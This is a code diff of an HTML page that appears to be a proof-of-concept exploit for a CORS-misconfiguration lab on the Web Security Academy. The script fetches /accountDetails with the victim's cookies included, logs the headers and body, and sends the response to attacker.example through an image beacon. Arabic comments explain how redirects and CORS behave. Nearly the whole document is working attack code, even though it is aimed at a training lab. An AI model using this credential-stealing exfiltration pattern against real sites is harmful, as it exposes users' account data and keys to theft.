@@ -2,39 +2,41 @@
 <html>
   <body>
     <script>
-      // Initialize the XMLHttpRequest object and the application base URL
-      var req = new XMLHttpRequest();
-      var url = "https://0a3800a30493bae484aa2f7a002a00ce.web-security-academy.net";
+      (async () => {
+        console.log('page origin =', location.origin); // تأكد إنها https://joo-ex.github.io
 
-      // When the request loads, run retrieveKeys
-      req.onload = retrieveKeys;
-
-      // Open GET request to /accountDetails
-      req.open('GET', url + "/accountDetails", true);
-
-      // Allow passing credentials (cookies)
-      req.withCredentials = true;
-
-      // Send the request
-      req.send(null);
-
-      // On success, exfiltrate the response to your collector using an image beacon
-      function retrieveKeys() {
         try {
-          var data = encodeURIComponent(this.responseText || '');
-          // replace attacker.example with your collector domain
-          var img = new Image();
-          img.src = 'https://attacker.example/collect?data=' + data;
-          // append to body to ensure request is sent (not strictly necessary)
-          document.body.appendChild(img);
-          console.log('exfiltrated, preview:', this.responseText && this.responseText.slice(0,200));
+          const res = await fetch('https://0a3800a30493bae484aa2f7a002a00ce.web-security-academy.net/accountDetails', {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'cors',
+            redirect: 'manual' // نمنع المتصفح يتبع redirect تلقائياً عشان نكشف 302
+          });
+
+          console.log('fetch status', res.status);
+          // اطبع الهيدرز المتاحة
+          for (const h of res.headers.entries()) console.log('header', h[0], ':', h[1]);
+
+          // لو الاستجابة مقروءة، اقرأ النص
+          const text = await res.text().catch(()=>null);
+          console.log('body preview', text && text.slice(0,300));
+
+          if (text) {
+            // exfiltrate via image beacon
+            const img = new Image();
+            img.src = 'https://attacker.example/collect?data=' + encodeURIComponent(text);
+            document.body.appendChild(img);
+          } else {
+            console.warn('no readable body — likely blocked by CORS or redirect');
+          }
         } catch (e) {
-          console.error('retrieveKeys error', e);
+          console.error('fetch error', e);
         }
-      }
+      })();
     </script>
   </body>
 </html>
+
 
 
 
